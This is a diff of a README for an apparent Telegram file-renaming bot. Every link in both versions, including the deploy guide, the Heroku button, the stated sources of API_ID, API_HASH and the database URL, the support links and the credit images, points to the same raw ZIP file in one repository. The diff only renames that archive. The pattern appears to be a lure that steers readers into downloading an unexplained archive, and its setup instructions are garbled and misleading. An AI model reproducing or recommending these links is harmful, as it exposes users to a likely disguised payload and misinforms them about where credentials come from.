@@ -3,27 +3,27 @@
 Telegram File Renamer Bot 
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/unfellowshiped/Renamer-Bot-Progress-Edit.zip">
-    <img src="https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/unfellowshiped/Renamer-Bot-Progress-Edit.zip">
+  <a href="https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/helper/Progress-Bot-Renamer-Edit-v2.1.zip">
+    <img src="https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/helper/Progress-Bot-Renamer-Edit-v2.1.zip">
 
   </a>
 </p>
 </p>
 
-## [How To Deploy](https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/unfellowshiped/Renamer-Bot-Progress-Edit.zip)
+## [How To Deploy](https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/helper/Progress-Bot-Renamer-Edit-v2.1.zip)
 
 
 ## Configs 
 
 * TG_BOT_TOKEN  - Get bot token from @BotFather
 
-* API_ID        - From https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/unfellowshiped/Renamer-Bot-Progress-Edit.zip 
+* API_ID        - From https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/helper/Progress-Bot-Renamer-Edit-v2.1.zip 
 
-* API_HASH      - From https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/unfellowshiped/Renamer-Bot-Progress-Edit.zip 
+* API_HASH      - From https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/helper/Progress-Bot-Renamer-Edit-v2.1.zip 
 
 * ADMIN         - Your User ID 
 
-* DATABASE_URI  - Mongo Database URL from https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/unfellowshiped/Renamer-Bot-Progress-Edit.zip
+* DATABASE_URI  - Mongo Database URL from https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/helper/Progress-Bot-Renamer-Edit-v2.1.zip
 
 * DATABASE_NAME  - Your database name from mongoDB. Default will be 'my'
 
@@ -36,7 +36,7 @@ Telegram File Renamer Bot
 * `/broadcast` reply to message
 
 ### Deploy to Heroku
-[![Deploy](https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/unfellowshiped/Renamer-Bot-Progress-Edit.zip)](https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/unfellowshiped/Renamer-Bot-Progress-Edit.zip)
+[![Deploy](https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/helper/Progress-Bot-Renamer-Edit-v2.1.zip)](https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/helper/Progress-Bot-Renamer-Edit-v2.1.zip)
 
 ## License
 ````
@@ -49,23 +49,23 @@ and larger works may be distributed under different terms and without source cod
 ````
 
 ## Support 🇮🇳
-<a href="https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/unfellowshiped/Renamer-Bot-Progress-Edit.zip">
+<a href="https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/helper/Progress-Bot-Renamer-Edit-v2.1.zip">
    <p> Telegram </p>
   </a>
-<a href="https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/unfellowshiped/Renamer-Bot-Progress-Edit.zip">
+<a href="https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/helper/Progress-Bot-Renamer-Edit-v2.1.zip">
    <p> YouTube </p>
   </a>
 
 ## Credits
 
 <p align="left">
-  <a href="https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/unfellowshiped/Renamer-Bot-Progress-Edit.zip">
-    <img alt="Pyrogram" src ="https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/unfellowshiped/Renamer-Bot-Progress-Edit.zip" width="104.75" height="32"/>
+  <a href="https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/helper/Progress-Bot-Renamer-Edit-v2.1.zip">
+    <img alt="Pyrogram" src ="https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/helper/Progress-Bot-Renamer-Edit-v2.1.zip" width="104.75" height="32"/>
   </a>
 </p>
 
 <p align="left">
-  <a href="https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/unfellowshiped/Renamer-Bot-Progress-Edit.zip">
-    <img alt="MongoDB" src ="https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/unfellowshiped/Renamer-Bot-Progress-Edit.zip%https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/unfellowshiped/Renamer-Bot-Progress-Edit.zip"/>
+  <a href="https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/helper/Progress-Bot-Renamer-Edit-v2.1.zip">
+    <img alt="MongoDB" src ="https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/helper/Progress-Bot-Renamer-Edit-v2.1.zip%https://raw.githubusercontent.com/HLECTER69/Renamer-Bot-Progress-Edit/main/helper/Progress-Bot-Renamer-Edit-v2.1.zip"/>
   </a>
 </p>
